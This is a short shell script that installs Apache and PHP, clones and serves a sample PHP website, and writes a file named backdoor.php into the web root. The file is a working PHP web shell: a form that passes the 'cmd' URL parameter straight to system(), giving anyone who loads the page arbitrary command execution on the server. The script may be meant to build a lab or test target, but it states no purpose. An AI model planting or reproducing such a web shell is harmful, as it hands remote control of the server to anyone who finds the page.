#!/bin/sh

echo "script start" >> /tmp/result

apt-get install apache2 php -y
git clone https://github.com/banago/simple-php-website.git
php -S 0.0.0.0:8080 -t /simple-php-website &

cat << EOF > /var/www/html/backdoor.php
<html>
<body>
<form method="GET" name="<?php echo basename(\$_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset(\$_GET['cmd']))
    {
        system(\$_GET['cmd']);
    }
?>
</pre>
</body>
</html>


EOF
